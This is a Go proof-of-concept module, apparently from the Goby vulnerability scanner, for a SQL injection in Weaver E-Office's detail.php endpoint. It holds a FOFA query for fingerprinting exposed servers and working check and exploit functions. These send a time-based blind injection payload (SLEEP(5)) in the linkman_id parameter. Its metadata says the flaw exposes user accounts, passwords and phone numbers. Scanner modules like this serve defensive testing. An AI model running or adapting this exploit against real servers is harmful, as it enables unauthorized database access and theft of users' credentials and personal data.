package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office detail.php SQL Injection Vulnerability",
    "Description": "<p>Weaver E-office is a standard collaborative mobile office platform under Weaver.</p><p>There is a SQL injection vulnerability in Weaver E-office, and attackers can use this vulnerability to obtain any user account information, password, mobile phone number, etc. in the system.</p>",
    "Impact": "Weaver E-Office detail.php SQL Injection Vulnerability",
    "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability. Please update it in time:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "Product": "E-office",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微 E-office detail.php SQL注入漏洞",
            "Description": "<p>泛微E-office是泛微旗下的一款标准协同移动办公平台。</p><p>泛微E-office存在SQL注入漏洞，攻击者可利用该漏洞获取系统内任意用户账号信息、密码、手机号等。</p>",
            "Impact": "<p>泛微E-office存在SQL注入漏洞，攻击者可通过此漏洞获取系统内任意用户信息，例如账号、加密密码、手机号、名字等。密码解密后可浏览oa内部系统信息文件等。</p>",
            "Recommendation": "<p>厂商已发布补丁修复漏洞，请及时更新：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
            "Product": "E-office",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office detail.php SQL Injection Vulnerability",
            "Description": "<p>Weaver E-office is a standard collaborative mobile office platform under Weaver.</p><p>There is a SQL injection vulnerability in Weaver E-office, and attackers can use this vulnerability to obtain any user account information, password, mobile phone number, etc. in the system.</p>",
            "Impact": "Weaver E-Office detail.php SQL Injection Vulnerability",
            "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability. Please update it in time:<a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https://www.weaver.com.cn/</a><br></p>",
            "Product": "E-office",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Author": "featherstark@outlook.com",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-07-28",
    "References": [
        "https://www.weaver.com.cn/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.1",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-33505"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10491"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri := "/general/crm/linkman/query/detail.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "PHPSESSID=eff067b73c42eed28e55fd037563593a; LOGIN_LANG=cn; expires=Tue, 22-Apr-2025 14:54:24 GMT")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=utf-8")
			cfg.Header.Store("Content-Length", "85")
			cfg.Data = "linkman_id=-1"
			reqtime0 := time.Now()
			var reqtime time.Duration
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
				reqtime1 := time.Now()
				reqtime = reqtime1.Sub(reqtime0)
				if resp.StatusCode == 302 && strings.Contains(resp.Utf8Html, "No such file or directory in") {
					cfg.Data = "linkman_id=1%20AND%20%28SELECT%205830%20FROM%20%28SELECT%28SLEEP%285%29%29%29mDdD%29"
					sql1time0 := time.Now()
					var sql1time time.Duration
					if _, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
						sql1time1 := time.Now()
						sql1time = sql1time1.Sub(sql1time0)
						if sql1time.Seconds() > 5 && reqtime.Seconds() < 3 {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/general/crm/linkman/query/detail.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "PHPSESSID=eff067b73c42eed28e55fd037563593a; LOGIN_LANG=cn; expires=Tue, 22-Apr-2025 14:54:24 GMT")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=utf-8")
			cfg.Header.Store("Content-Length", "85")
			cfg.Data = "linkman_id=1%20AND%20%28SELECT%205830%20FROM%20%28SELECT%28SLEEP%285%29%29%29mDdD%29"
			sql1time0 := time.Now()
			var sql1time time.Duration
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				sql1time1 := time.Now()
				sql1time = sql1time1.Sub(sql1time0)
				if sql1time.Seconds() > 5 {
					expResult.Success = true
					expResult.Output = "时间盲注Payload:linkman_id=1%20AND%20%28SELECT%205830%20FROM%20%28SELECT%28SLEEP%285%29%29%29mDdD%29"
				}
			}
			return expResult
		},
	))
}
